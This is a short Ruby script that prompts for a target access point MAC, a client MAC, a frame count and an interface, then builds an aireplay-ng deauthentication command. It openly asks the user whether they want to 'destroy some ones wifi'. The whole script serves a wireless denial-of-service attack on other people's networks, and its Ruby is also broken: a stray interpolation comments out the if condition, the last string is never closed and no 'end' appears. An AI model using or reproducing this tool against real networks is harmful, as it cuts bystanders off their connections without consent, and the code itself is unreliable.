puts "Would you like to destroy some ones wifi?"
puts "Y/N"
really = gets.chomp
if #{really.downcase} == "n"
    puts "EXIT APP"
    
    else puts "How many de-auth frames would you like to send? (0 for unlimited)"
    frames = gets.chomp
    puts "You will send #{frames} frames."
    puts "Enter the MAC addr. of the target AP:"
    ap = gets.chomp
    puts "Enter the mac addr. of the target"
    target = gets.chomp
    puts "What interface would you like to use?"
    face = gets.chomp
    puts "This is your final command: aireplay-ng -0 #{frames} -a #{ap} -c #{target} #{face}
    